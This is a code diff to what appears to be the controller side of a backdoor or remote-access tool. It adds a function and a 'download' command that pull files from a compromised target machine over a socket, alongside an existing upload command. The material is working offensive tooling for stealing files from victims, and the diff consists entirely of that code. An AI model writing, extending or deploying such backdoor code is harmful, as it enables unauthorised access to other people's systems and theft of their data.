@@ -32,6 +32,24 @@ def uploadFile(fileName):
     f = open(fileName, 'rb') # Open the file on 'read bytes' mode
     target.send(f.read())
 
+#  Downloads the specified file from the targets file system
+def  downloadFile(fileName): 
+    f = open(fileName, 'wb') # Open the file in reading bytes mode
+    target.settimeout(1)
+    chunk = target.recv(1024)
+
+    while chunk:
+        f.write(chunk)
+
+        try:
+            chunk = target.recv(1024)
+
+        except socket.timeout as e:
+            break
+
+    target.settimeout(None)
+    f.close()
+
 # Sends and receives data to and from the backdoor
 def targetComs():
     while True:
@@ -50,6 +68,9 @@ def targetComs():
 
         elif prompt[:6] == 'upload':
             uploadFile(prompt[7:])
+
+        elif prompt[:8] == 'download':
+            downloadFile(prompt[9:])
 
         elif prompt == 'help': # List all the available commands to the user
             print(termcolor.colored(help.HELP, 'green'))
